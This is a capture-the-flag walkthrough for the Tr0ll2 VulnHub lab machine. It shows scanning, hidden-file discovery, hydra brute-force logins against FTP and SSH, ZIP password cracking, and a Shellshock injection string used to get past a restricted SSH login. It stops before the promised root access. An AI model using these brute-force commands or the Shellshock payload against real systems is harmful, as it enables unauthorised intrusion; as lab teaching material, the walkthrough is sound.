# Tr0ll2 VulnHub Walkthrough

## Overview

- **Difficulty:** Intermediate
- **Objective:** Gain root access and retrieve the final flag.
- **Tools Used:** nmap, feroxbuster, wget, base64, hydra, ssh, fcrackzip

**Target IP Address:** 192.168.48.166 (replace with your assigned IP).

---

## Step 1: Network Discovery

Perform an initial scan using nmap to identify open ports and services:

```bash
nmap 192.168.48.166 -sV
```

**Output:**

```
Starting Nmap 7.95 ( https://nmap.org )  
Nmap scan report for 192.168.48.166  
Host is up (0.0084s latency).  

PORT     STATE SERVICE VERSION  
21/tcp   open  ftp     vsftpd 2.0.8 or later  
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)  
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))  

MAC Address: 00:0C:29:4C:BC:34 (VMware)  
Service Info: Host: Tr0ll; OS: Linux
```

---

## Step 2: Web Enumeration

1. **Visit the HTTP service (port 80):**
   - Check for visible clues on the main page.
   - View the `robots.txt` file.

2. **Use feroxbuster for directory enumeration:**

```bash
feroxbuster -u http://192.168.48.166/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -C404
```

**Notable discoveries:**
- `/dont_bother/`
- `cat_the_troll1.jpg`

3. **Analyze the image:**

```bash
strings --all cat_the_troll1.jpg
```

**Clue found:**
"Look Deep within y0ur_self for the answer."

4. **Access the hidden directory and retrieve the encoded file:**

```bash
wget http://192.168.48.166/y0ur_self/answer.txt
```

5. **Decode the file (Base64):**

```bash
base64 -d answer.txt >> pass.txt
```

6. **Extract usernames and passwords:**

```bash
cat usr.txt
```

---

## Step 3: Brute Force Login

### FTP Brute Force

```bash
hydra -L usr.txt -P usr.txt 192.168.48.166 ftp -I
```

**Result:**
- Username: Tr0ll
- Password: Tr0ll

### SSH Brute Force

```bash
hydra -L usr.txt -P usr.txt 192.168.48.166 ssh -I
```

**Result:**
- Username: Tr0ll
- Password: Tr0ll

---

## Step 4: Exploiting

### Access via SSH

```bash
ssh Tr0ll@192.168.48.166
```

**Note:** Upon logging in, the connection is terminated automatically: "signature issues"

### Access via FTP

1. **Log in to FTP:**

```bash
ftp Tr0ll@192.168.48.166
```

2. **Download the ZIP file:**

```bash
get lmao.zip
```

3. **Crack the ZIP password:**

```bash
fcrackzip -u -D -p '/path/to/pass.txt' lmao.zip
```

**Password:** ItCantReallyBeThisEasyRightLOL

4. **Extract the ZIP file:**

```bash
unzip lmao.zip
```

5. **Inspect extracted contents:**
   - Locate the RSA private key (e.g., `noob`).

---

## Step 5: Privilege Escalation

### SSH Access as Noob

Use the private key to log in as `noob`:

```bash
ssh -i noob noob@192.168.48.166 -o PubkeyAcceptedKeyTypes=ssh-rsa
```

**Troubleshooting:** If login fails due to signature issues, use the following workaround:

```bash
ssh -i noob noob@192.168.48.166 -o PubkeyAcceptedKeyTypes=ssh-rsa '() { :;}; /bin/bash'
```

Once inside, explore the system for privilege escalation opportunities.

---

## Final Notes

**Disclaimer:** This walkthrough is intended solely for educational purposes. Always ensure you have explicit permission to test systems before conducting any form of penetration testing.

Happy Hacking!

